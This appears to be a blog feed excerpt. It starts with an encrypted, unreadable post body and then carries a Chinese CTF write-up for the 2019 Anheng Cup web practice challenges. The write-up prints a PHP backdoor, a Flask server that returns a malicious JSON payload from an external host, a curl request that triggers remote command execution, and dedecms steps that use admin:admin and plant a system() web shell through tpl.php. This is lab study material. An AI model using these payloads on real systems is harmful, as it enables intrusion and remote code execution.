be1e662807186a3f6af8bc6f5ae4b47600edc41f2a85fc2114328760bdae1dff4b91ea81bf5418091c92566c280788220bc36ce36b8c4403a0342c50490eebc6145d4787ec83e6846e97a760f259c383519c4cf1b014b4ef86443f9d3e73c231d57a7b7de784968057a32093d391234ca60a004846e26308a67eb5cf029d19b32e50b4859cc8cf03e9f357f2a57ec60d2b2735273874e5a5b6aa8ff1e9e765f0d86f0e6dd72f502fa67d013a47019ed8e9aea655070084c78f736f5fa77fc2fe5fb5a190c59f79e579b67ccfdd89fae8d679987c176ec1fe65dadd99ec379d5ec8c23491d4e96b6dc8e8b4673629001fcbb915e09a7aae06b0bed4d791c822dc724f72baf92834a1db961e806781e60a564ed9fe80775e0ae30a669619e255ce8af7f369702bc31cd02cba9a7bd2ca946e777ca795514c642cd122e4f5d8bd27d79531df6cf9f5e11edf50ffefba2f99bf2703fb5c7d46d075d3dfae9044b85548b7139144710ef89a47d48628fdddf5e0c90458155ad178a2a25cfd05afb5b7378b6993064717e00e75a1a8816310fd3b353cc89c9692872aa114b8742bbf548047ff79d3c1efa28c88d57eb4b794b8251157f9a53f23235a9a3fe68a2c97dbca90a34ec9cf5169dc7b23f5bc0b244a8a26a82f5551faeffc0137de06c22734f52f488bf584877c584fde75c1f3815683b0ba4d22e5015f523422fc9cc56f630caf8177b2ac9d6bb39b5eb0b90adf1e4c91b4231adfb1e8607278e0c4009e5534a578048a7a406188dc0c6d40c4c91d5869a046c70adb624ed0b7e65b4fa4640823683f27fcfa15b73ed02f7b65a4d8244c681231d3a3b6aebd48dae8efa419a51ddf8bd2d26e4c7fae4c256882f1c468f04cd6c1c98ad0163b75b28d4c425fbd78cd288f093a3cb091cf397d30a64579b8332a8d8448c0d73e42403bceac0268c878b3e776eb54a1594533ca9d5ef2b2189ff50d49d17b5b08f6829ea8455b6a708f4e99e770ae9376adfb66b104d41392c223bb85c70ebcdc51cf8686b6c9879535efd58e1337f2357228b2338e20c636b082b3a399a9a9d88cfc932a06d2afebc27119a14acb85c6080dbf34336d4fc506b3c55f63fc37526813f6ced7fece23cd528c309a6ce3314294efdd576bd21d6a8675112de989c5c2ce2282616efab1a997cb1e6acc4f75520051397460a8c115a77ccc758821abb6d0f3032747a3cb407b76e6225e14f2388f9e182778ca7b85131d30a1e4d7e19170cd1a0a6372a20b3953b2be40df93d75c86129f7ce8378ca4876c09d79c6677342bc121ed238eeeb753bfb002f3cb01b125c91b38130f9ca6395863d0e39cd5b39c46b710be3b7b7c9c6b556a19d15e15ef52569c05523185b42af8ebb9aa227674c861feba0cf37a2e4c1cac184d9a55f36bed08853590335ef59e5beb5063f6c7857025b847d48924261665326f1305d7ca6d34107f728e86bc91ed710cd2c33e224ae6af9661e780012473a1df79e2a5ccd79179ca22b871c04b6a318422a216a68b09a40a468d34c876b9e61872e102a3ac04689b9d089a0837ba48ea86791f0e635f742cc3e6b5709363d14689d43edd70e4a4ece6cb334f83b7ec26c1ebc7ecc2d1436d27dafc551df48de2c25d75c77a0ec92b4f6ff27134d3905a216bb0ede8d93ec8a38e464fda0d04104818c5abbb748e7a1fcf7e21fb6802e775f86d4f569e64f0dda7d49386e8ca75e0b651aeeaf18bb657dd3614527e66565cb5b7fe415d552fe98e6ca7e275d35ef6531f3f9516c6ca4e34209ca30c7572689049e75242a06fb8d9499199f6647b964cfb8d0cdbd4e5dc4236f5fd3f412aff17034f1639ffb45c3736f892755e12274ef06a3f4c0326917de4538741918fbdf56522e266a3fcb35ed8a97190d522bbb0190ff74760610ac7b8085a38041761e853a8bf798782932e05b4918c74de357a7f973408b6fa8d0b0515376a1f753c5ffe45f2e993cbb8d9578f0e5663e269d289c1b220db7a4a0e7332040b69fec6b24152e904898fa9327c536c762fe1ced344f6272fa8d38c1e5f645bb861415e715e89c413f0a734b4ae232c95dff980d2f19e3c6390b0ecf0c0915b1853cd7702fb59a686e1f767c63bc03d18e57d0ceaf1305e2d886411f983216da0fc639d196b3d1621b9ca601c9056c5f5f07f5ea4fdbf850e7a13156956dd43650fa8019120174d2c4d00983c67c3d0a86c5687c0ebb631fb40eec2daf6e902a681f9cd8e1814c986a5c1c7e183eae350aac01cda6e44f018ff31d52427de7b2f6cd357a2934a5309d6ea949bfc6c3373a14cc9d2a73232258b9ae60713ab8e83881e5ad56d77f4f28afbcd73e992f81c42db1ecbc9bd001e7dc074026683f8269cb9a21b91249867cf91db46ca068bac1fd9d515b758bbbcedfcfaed89e80dbd3b84f60b5cf6dae2a93757e575f538425653c2eb7814a2575be661d96d4f975dd9b9fde1318278b3fa593f503b97f33debb346f3200557dc4d6e4185d2b50bc7b4d254a7506a595279a8d0c77461c4f7a0b375a856f6657bff76b5189449dda57df178793c50236928b96d83bcfa219768de1a30766c5009d622a86264f6517cc46eb14cc59a88ac56ed063c696979ea65115b05fbdf6a5f9f24664b879d64cbc4b3cddc2632fc1fc596c2c4aeb19539d9a60e1d77bedc2ef64899892688f21592a01d28b1f7091303871b4af811563e639e16e60da99c3682607209c59d4c95c182dbf0f5d79f75dfe968494e5615e38666313fdae82d1696e3f666245c22fb4ec59e786ee37dff02cc395897e708d6d1e887ee19f26b6a9cfdcfedc80d435e5230a8bbfe122f7cedf62d1834a2bb0af4f3a31c1fa99c15b9313dd89691623eab216b7d09a6b86961018c63bd657fddad50d1308e6c2ec9a243ea27b5f13b27652435356dcd8244d45b7e0c9d97f16fa6fb3ec82f1ea51e57317055479e2d155d328694e956312345180a0514b334262ebe0f18cc2bfa98017c843a7609e91533e4a707bbf8856663608f907519204623195c622845f520b5912550212ab48ea82878e16c3e5c36c6e716d1acc41be9739adabcf9e8dc28d3aa450e753cf7fa053a7ff21b1838864a548dc52676526f226f37571f294957f34cd42f97c3192492ef3ee6afdea52bd18cb07d09f605843ec76f6fede4f9f40b34596c918eff644548373001844a6fe8667a502f6767d287393b08a997986956c804206051888cc8d05fd93256b31de49f4310c872fb2f291499392f8b713d9cbf414e2244dbde1ac6c0d89ff21063fca7dcdc12fe4b331a6ba403f9968f1d1ee97830031a9328b57b20e7ca63de7b08ac715d66faa568d7cefed34a56996877ee89a36450df9989254da5c8a5d620883d9baf834ee1feac48a1e692b070ba48a518d535c6ff0c856f12a8ed0c48a9eb29b3c06ae1dfe6c5be5327e18871136e3ea40b2302886996ed66018b054771e1837471524a429837afb0a3de1c7f7a6ac7d4a6823455c7b9c5cac5ecdf974b9af7378a42a6c0c6f035e1b9383d039cc95bf6f0fbe76b63b1c839af92ea62db7b8e2c5c77df86539770d1d771561239ee3f5ea9a0f71c373a1198a391c0701a4b6171b5bea53f66d04f439a0c7961b9c6491ba82834af4d9be64a2aba992618507501e99e6cece449766d96e891b96398b4cfeb7d4978358aa4449947d87d72e05b6bbe5095122e8329d829ca8ae21363920d652475c5462d43c397312479e1cab7bb0d988815f8b638d38ba09a84973b2e8014ba896dc0e4e97ae336aeefeaa3102f976b77a12754f5900c8968a7677dc545ec1ecbbd12993489e2524cd4ee0845d32da6fe9898ea9942176405a34b5c7649c24ed315766cb3ba363b8a8fa57ccf53870a383bef71df9ff6533bef0d60618bd716e563604dfd731024677cdfefb32b0139ac75e3538336ca974c077e4c8a610600af49585e586e2ad0d3a362759f08b943d508b519fc219c9656faf6477339955c07c476c4045c78b77c992647eadeb06b9b7f2eb017ce3f25ee7300413a8dc54301b0bf84ef374071cd9693956fe8298546c355b65891ea9beb0eafa94ad44bf1877ed5446dff9c2f7b1cc1dcb6fbedf79062c5d9ba1af3c64f9e14eec8a095696c2d49a4a448971fa677f93863b32ca469ebc09af93fda1e43090605e5d1ab6d5f9570c60c1ed70dfdaa8dd673d848248c6ecbcb19896bd338e6030112d5ad590bd477efc0b53ad8fb6f97393c2650edf0892268af36b2128705a9e9de95d7d14f22b95654e368b8c0afc9fcd40462940e0f9eb23e7f693d873fea8711d5fd656a35c89a2c42f60296d149954d2cdb8c1a7f34a6b45a182144cfaa2cacf0d1ab5db7ee2a93e521f3271c14b82646611d6027d06e10189c745ce21cfa7fc5bf334e1dd2a9c14ef75a60099365ad6cf855fcc7f56bfefaa548693f927df89b5955c079f4970471710dbd8920d5fb16380f6caf60c2ff60b478b09f3705cf4bd95e0c4c3f49b52911dd1a106f5e58ba638d3dda2f0006547c43aa9b98c0cd23497ba23fb7370608b82d9128c4f90c749987e5c1bf050e0bc6c7b4478a4894cd2020e85d44c9232767e3063062614609500031ac90dc05f78049dfa66dfd3f7919b95d22e1a44d7f518e3ffa47b2ff101a7ff86d02c5494b1b5537ff3babd0e2bf69fb0b42a7b5ceb33a7acafd9f6ba8898e091b93f6c9747eb832ba7e3dcf97c6df94dd5034164857426813d8be4fb401da55025e85fc314ea53f70bb5a579ccced466e1503999989c89c0430e38c07c08c9dc8fa5bfcc19558202d1791fbda4b1e864addae95b0899cb951fa48df23dff6ed94d0ae0cce6b86e9b1cfd71dffe0c3ba2f70b9d64828373c2cda12b5ddf501e9d5dcaae4acef7bf50ce9ddf810f22377f50ca0ae8a40b347e02a1769543dbfad83c0e339ee24e20aa01fdb8f7a925d5262d384cc3197d0225a209180af2b51d72a4ed3931c089979753b18ed7d690a6a0b6d60d2eb09f3099bcc462ae0e1d142fbc649daa5c7993fd1219e92e45567ce2ae0240137260709cc337c99693d1e1d2290cd733c80d8d23e6b1a5d97d20de4b7ba1901621bd15ac65775c718071d5da34a799b9d9a80b11460aaa1a9784ecfa6e80e8b2d5f0e8b494e405e85563f481b4f7d7176b1fa197f97fd4813e1edf8fb220679fa44f1ff4f4f6f11868d80ea555877e67c224ffd39fe0e919888a5bdf200fd95ac0daac197d3e51083b3ea6655154aa517ef9c9b78f446d943c56ecb3c4a662018b9a555b9266fe18e7daedc4bfd0058b60e51d4b5adb0c3fb35ced67607399858ef3238c26abc686d4c65236b5646dc660736c14e981954127460bcba152cc39b228c232c1d488816c54cffd24f24467c8afafa7d8107e9d47de902798ac3393d46cd3be1e38035aaca599d380921eae7d3c7b570d171d67df73bdd9a1ac8da87be9953176bba75705cc541d885b3fc94a6365f21e6dcaa02894b4653a144395df9b26868aa2ab4b15cd7b99b479c7605c1d5c1488dbf50721711137f1bdba41e67aaaa79837804dfb2b08a28d2ada32a7c827442c8246a6caa435737508a30f25c660090f9ccb0b35cde7018200d00ab37552c21bdab3bf048fac4f191fe934d989706e99d7caaf2d1f822703b8a63bc1449b5ead4138e259a7cbcc0baa8a9de7adaff55cf1041983f657f56fb7b388f44d0a3c99caee173460ea2147ddaa21c80480f37382a73c59fb503e46041fad4da9caac7e817d7448cd8cd7aacbe5fbb7487d502346decc0a9e4a831af7fc31dced8692dd0d54b6522b6146743a96d37d52f92b654e8b385d36e34b7d22bea572330342f2d69262991aee96bcb0dd26319476255aa4b51ab256c4127881534ef2ccaae7298f2abace98a3c2a0c50ec6f43f6763ee62c60071d0ddf25ccc6dc0b385fb12c6182bf0bc44c838c0b734befd4f7a361c6e26ef8a5cc4a73f3d6fdd58df32082f9b4e31bda2eac03c930dacdf8759c9263a8fac422ea58181a3d1b8bd1c9af77aa5cb899cc75276d14a0a8f86e1d67ee368500d25a4686bb307be511a197f74fa30048d56ae21bfac33b74ffa8277ebf3235c2805485658309a48187d495ab37b076329f8dc37fe592bfe692caa8994af7f56430f42c9dafc63c67dc4478557a25d36400319790b940056ff570f089682e3cfe28802ce0d366d6ab8b648387df750d1fc4bfd0302b95c8cf5f1bf632275900a1e64683535a94965d553f894ad57c4d4ea40a3d30bcea4daf683bcd70f8ea9a87ac50e41170fcc4c9dad1ada20fee121a15b6a6357da9f98e2773691fffb41b61bc5d64b589022d6f5b9cb5f8ef2521ffabf9fb678c301f5e6b84b5e14178203ea75461ef0758619629c9788d2ff03e919ef1edf6dc7d4f6d163cea5851773608403e0dcc3df604ba6eaf6df3c07a39a64a60e31ba76570c000aa7c4b1a34def49daaae3157a0b3c2842ca2253efd4dbc92951256c9270e38bd40ce8855eec954fb73753795c4ce4ca3cf6134eaa4f5ccce71d24e64e2b8a70f2bfaff095649ddc3dfe2ebb8e4cadfc2a905a4cfd0e1a509b0ce479c9a5366f0f18353b5c0cb40d0ae9a2d0333f31cf1447d3e85045b1b34a4f3446c492dc671f5a01b609aafbab25cac8c23f0d38c2a831c18187ed4555e7db50a7860967030ab0fcf3eb9943e9795ba1dcf9f4c02acb4876521037423f4f8fe16388d36ddb185cc93f9c2ee8aa87b8aaaeb990a7cf7c493a639fd3d48c5da7a44c94d8dc402646cf064886e43bc21051728b259a9e45a7ddd12c9655456e61f3dfa9148f40b10b5db258abca612aee5507e292d6774a183d499c771263381049d8def677e6ce1a30251a135ed5cd4ccc6d5694547925dee1fd43712f33ce1a01092f0d22de51fc09a3ec3fbeb113aa9e4f2e578c918dd14463a7503445ab8fcd08372875966693e0165febcf85d8ccbcd349f28ebf495cede55d5adf42328784a3ba0ece0d690bf7ed9b977231e2bfde4357e3e6c324bdfedd5273040f1eece013ec64bb06350c25a8118ebfb2e1cf1d8d62eaac3d69ff3f388efa6fe4563bc849cc2edc49fddf2c1b5e84a9b8dfd122376f4bef6a26f0a8e39314cca5b073e6c788621f0a2b792e82662579dc1679d2bb0d2707e23cfca413becf0f2f78b3e77b2b8c520eed5d31a41582e6c5faf81b2092deef7c44edc3f7c3fdd75aedbbfca4239d7349c9ccf62a8e6eae7eb995582fafe98a3830312a10cd8f15cdb3a889bc207da9cfd501c29bf4bb08b4cd757945385ca5d40011e2d8835ca87beb9ba930c88d112f19d36eb7075592471f68bf635e606986334a558129cfca6ac67b35c3a754938816964ffc322ec6caf955fb7cc97e77b8ff4bfacf29af14c0900557f6ce7cebeb4f4827c8c38187de0f3ac7e8993bf83d21312baf38a87bcbcbc067cb5a850c107566125f3629907523d512786ede26a72978d51509d4b82c1fda42a04a320b4c3727d0d695f169b8ea639bd6272acd83f9b4524eac904b35134e675aecdfaa98b2ef0c5a3f9eece14d64ab9ae702aa9f40cbc517fe7b7dda032bfc34b4b21c3cc9bcb2f25a163d82d5291e19b336c8fc8578f457744471fa2d36a25fa9e21abdcb1e2b497c65ce47ba37c54c664323b7737d9569fb114a6e744561c03af68b549a56f83051063f504290a6276fe59d7509d8af6d6dd4c7a3fdf311d46b8ef659b6b884a29f7aa4f1d2dbb596907061314df885b3f1159fecc6dce12343f58ad72aeb89dcc568d0d4a5c19768f9d493c3c90d18d2b4e83f8d315fac119d0c942ace1e334b28a5a67635b0c1c1bcddd116a7c8fdc32f2518440cc0429410474ba70707856872a33ee46e3a38be27b6a10a828e610d95306f4b7d1762a28f0a64470f2a977aa025122459744ac767c8bd3a3884d50d6131cbe67c024009942411ef4d355aca7f1935023e049c75b93a8116a0912dd30cc00bc2bdc9648babe912d36ea0a4746f062b5480a5c66abdfd25b0d57e27e4f348d696d2cd2c2a0066a95e32b7b8f2c62983c1ac790ce291a878e94df1426b775c0f1c1addeda8698f835d0965428a618fdf64c473197c8066003274d4bacbaa2c5933c5ab834c1b403398fd36d4df172752343d8a153f4970d683ce51fd4f36f8cd01db6642a4292579377aaf13f9af73d3ccddaf2d9b394da52044952fe10e164676a5f564c517e764c41e28e3cfa833e988f282319a5f2f13e5d442bfbfa5929d57760e53c853573bdd133d8fdc0c2ae3724c4bbf0fba91ec43031878c4417e0b4236c8b906dcdd52e034e7cebe3c02c5c427c551516bc01db1b9c8ed73d35c94e0a3abdd54ebb4982a00387f50134eb3dc14fb7c0ccfeaa7fc70b750d199777b20866184770aa7f9a647c73be897b66206b2e3bee2174827c913b34b94af4a935f62ccbb440fffede70902c889f863221850897b7995f515a341e537660a447192ca02ed501566f787f64a71128e22702e07163e7e4a8d8202b7d7fdcca6a3d3a4335c977152f1ccab2d175b748f7aa49b87177c9c06f5c6d3248c580179f10b7eb82aeb90252df3b5f731fdb024765e1b578633b5d8b77505d0a7761ed010fc4ec6a094242b18cfaf3f40df090ca365d38a8fdea8cdedab9843dfb201155a498f743971d090eca05eeec12289dfed656089333fab8a75f4089f13d4f7905044917d1ac42ccbc06f192a5e51b9d678aedf3af0410d4a73f584aa38ed636a75877e5373e2ddbe24ec7146ecf1d681b69841ad93813e42211c55c6e28b954b784e9d3cf97bfa4f0146ad6bfd8f9f0350fc40815ff81c9d328b6835af8872740882f7ca170e0cb5512ff8c00d7df2e7855512b4451eba2ab24b9c39d85a09a0b3513a7a2c73086106b6b1de2c77a3336ac36e1569a886c09bdf04561a5073c63bdda5506ae0e188e76e6cbbb06ace50a3bcb473713b025908ad69d8c7fd72765ac2aae510ac0d013de8ba1f22b40ec00c7121b5bead6b9604dc8dbb79a7302e87d5d3c8b46b64dc4c667fbe8e57e5da107bbf79c69fb53e83d530b9bb32e8ccb84dbf9136a3c65e157de9684dc271cdc82096d91fc6a932831c5317e92494cb984ca261fd3a681b8e2ecc55d14bf467a317d910ade3ae1fbe6c8e11f264b3ac42ca6a72ebafd6f350ae876f2d969c8a3ddd3d904a993a25d908a7112a846a345f67832eb7ba3156d9b5206585a21507f2d22206ef2d39fead6559f3ce9a498f8251442a7c63bea27bcb8144b184370dd28444101a8dc0bdeae3a6d976840c0e61a732281283e346f32ba85a6ced880f961e7552dfa1b5071a04e1fa72d3e4d9af729c7f96517aa95f294d5cd9fa049c67996822c34da3e5fdab213206ba003b02ccca9f8e6f138a00809a8e21cd1b43ebb8a72d7efb8c3993fb4eb6721a0263014645115b95563fb1c7b5d3390bbf7026b74ed0d56e3ee97396a0ed4d7253f6e7b7fd3c8ac1b18d20d9e98211536a2d514cca4119d416b01024fa7ec1676bbceb1a38792167fd8534cb3e8ec7960d38f43b49829378c41546f099d202827a0affa0d21797f8e31d1c0eada9b5d2e293d283114bf4020959be6edbc0ffb4e66fe35af6af58e7ce031cedf3bf4f37eda4da0b058be595679da1</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      文章发表在t00ls上——https://www.t00ls.net/thread-53464-1-1.html，这里只做归档。
    
    </summary>
    
      <category term="源码安全" scheme="http://anemone.top/categories/%E6%BA%90%E7%A0%81%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="源码安全" scheme="http://anemone.top/tags/%E6%BA%90%E7%A0%81%E5%AE%89%E5%85%A8/"/>
    
      <category term="白盒扫描" scheme="http://anemone.top/tags/%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/"/>
    
      <category term="Fortify" scheme="http://anemone.top/tags/Fortify/"/>
    
  </entry>
  
  <entry>
    <title>2019“安恒杯”WEB安全测试秋季大赛练习题wp</title>
    <link href="http://anemone.top/ctf-2019%E2%80%9C%E5%AE%89%E6%81%92%E6%9D%AF%E2%80%9DWEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E7%BB%83%E4%B9%A0%E9%A2%98wp/"/>
    <id>http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/</id>
    <published>2019-10-17T12:38:34.000Z</published>
    <updated>2019-10-17T13:14:29.021Z</updated>
    
    <content type="html"><![CDATA[<h1 id="爱い窒息、痛"><a href="#爱い窒息、痛" class="headerlink" title="爱い窒息、痛"></a>爱い窒息、痛</h1><h2 id="0x01-路径遍历"><a href="#0x01-路径遍历" class="headerlink" title="0x01 路径遍历"></a>0x01 路径遍历</h2><p>打开地址看到路径遍历：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571126059065.png" alt="1571126059065"></p><p>在upload文件夹下发现后门和其源码</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571141073240.png" alt="1571141073240"></p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571141089817.png" alt="1571141089817"></p><h2 id="0x02-后门审计"><a href="#0x02-后门审计" class="headerlink" title="0x02 后门审计"></a>0x02 后门审计</h2><p>格式化后，进行代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">isset</span>($_POST[<span class="string">'pass'</span>]) ? trim($_POST[<span class="string">'pass'</span>]) : <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> ($a == <span class="string">''</span>) &#123;</span><br><span class="line">    echologin();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    chkpass($a);</span><br><span class="line">    helloowner($a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chkpass</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// UA是md5(POST['pass'])</span></span><br><span class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>], md5($a)) === <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">helloowner</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 这里产生一个url</span></span><br><span class="line">    $b = gencodeurl($a);</span><br><span class="line">    <span class="comment">// 从url获取文件内容，SSRF</span></span><br><span class="line">    $c = file_get_contents($b);</span><br><span class="line">    <span class="keyword">if</span> ($c == <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $d = @json_decode($c, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($d[<span class="string">'f'</span>])) &#123;</span><br><span class="line">        echofail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// CodeInjection, may cause RCE, e.g.,&#123;"f":"system","d":"ls"&#125;</span></span><br><span class="line">    $d[<span class="string">'f'</span>]($d[<span class="string">'d'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gencodeurl</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    $e = md5(date(<span class="string">"Y-m-d"</span>));</span><br><span class="line">    <span class="keyword">if</span> (strlen($a) &gt; <span class="number">40</span>) &#123;</span><br><span class="line">        $f = substr($a, <span class="number">30</span>, <span class="number">5</span>);</span><br><span class="line">        $g = substr($a, <span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $f = <span class="string">'good'</span>;</span><br><span class="line">        $g = <span class="string">'web.com'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $b = <span class="string">'http://'</span>.$f.$g; <span class="comment">// url=http://pass[30:35]+pass[10:20], i.e.,url&lt;=15</span></span><br><span class="line">    <span class="keyword">return</span> $b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echofail</span><span class="params">($h)</span> </span>&#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echologin</span><span class="params">()</span> </span>&#123;<span class="comment">/*...*/</span>&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>其首先检查UA是否等于md5(POST[‘pass’])，接着取pass参数的两部分（pass长度要求大于40），组装成一个url，从该url获取一个json，再从json中的f变量获取函数名，d变量获取参数，并执行。</p><h2 id="0x03-构造恶意json"><a href="#0x03-构造恶意json" class="headerlink" title="0x03 构造恶意json"></a>0x03 构造恶意json</h2><p>按之前分析，最省事的方法是在自己服务器上一起个80服务，然后返回恶意json</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,jsonify</span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">srv</span><span class="params">()</span>:</span></span><br><span class="line">    resp=dict(f=<span class="string">"system"</span>,d=<span class="string">"ls"</span>)</span><br><span class="line">    <span class="keyword">return</span> jsonify(resp), <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><h2 id="0x04-后门利用"><a href="#0x04-后门利用" class="headerlink" title="0x04 后门利用"></a>0x04 后门利用</h2><p>最后一步，构造后门请求。首先，假设我服务器是216.126.239.124</p><p>先生成pass参数，画个草图好写代码：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571317896911.png" alt="1571317896911"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: url=<span class="string">"216.126.239.124"</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: _pass=<span class="string">'a'</span>*<span class="number">10</span>+url[<span class="number">5</span>:<span class="number">15</span>]+<span class="string">'b'</span>*<span class="number">10</span>+url[:<span class="number">5</span>]+<span class="string">'c'</span>*<span class="number">10</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: _pass</span><br><span class="line">Out[<span class="number">3</span>]: <span class="string">'aaaaaaaaaa26.239.124bbbbbbbbbb216.1cccccccccc'</span></span><br></pre></td></tr></table></figure><p>再生成UA：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [4]: import hashlib</span><br><span class="line"></span><br><span class="line">In [5]: hashlib.md5(_pass.encode(&apos;ascii&apos;)).hexdigest()</span><br><span class="line">Out[5]: &apos;98a36c28cf36c4d8eeb8055a3538562e&apos;</span><br></pre></td></tr></table></figure><p>尝试发送payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://114.55.36.69:8020/upload/dama.php -X POST -H &quot;User-agent: 98a36c28cf36c4d8eeb8055a3538562e&quot; -d &apos;pass=aaaaaaaaaa26.239.124bbbbbbbbbb216.1cccccccccc&apos;</span><br></pre></td></tr></table></figure><p>可以看到payload生效了：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571144854091.png" alt="1571144854091"></p><p>找一下flag，需要修改我们服务器上的payload</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571145028036.png" alt="1571145028036"></p><p>然后找到目录<code>/var/www/html/flag.php</code>，cat得到flag：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571145141787.png" alt="1571145141787"></p><h1 id="dedecms"><a href="#dedecms" class="headerlink" title="dedecms"></a>dedecms</h1><h2 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a>0x00 信息收集</h2><p>打开是一个用织梦CMS写的网站，拉到最下面看到版本疑似是v5.7sp2，想到织梦CMSV5.7SP2后台存在代码执行漏洞，详情见<a href="https://www.freebuf.com/vuls/164035.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/164035.html</a></p><h2 id="0x01-弱密码"><a href="#0x01-弱密码" class="headerlink" title="0x01 弱密码"></a>0x01 弱密码</h2><p>访问 <code>/dede/login.php</code>，看到管理登录页面，这里存在弱密码： admin:admin</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571126576237.png" alt="1571126576237"></p><h2 id="0x02-代码审计"><a href="#0x02-代码审计" class="headerlink" title="0x02 代码审计"></a>0x02 代码审计</h2><p> todo</p><h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>第一步，<code>GET /dede/tpl.php?action=upload</code>，获取csrftoken</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571127184086.png" alt="1571127184086"></p><p>第二步，<code>GET /dede/tpl.php?filename=anemone.lib.php&amp;action=savetagfile&amp;content=%3C?php%20var_dump(system($_GET[&#39;x&#39;]));?%3E&amp;token={csrf_token}</code>，上传一句话</p><p>第三步，<code>GET /include/taglib/anemone.lib.php?x=ls</code>，能RCE了：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571128235789.png" 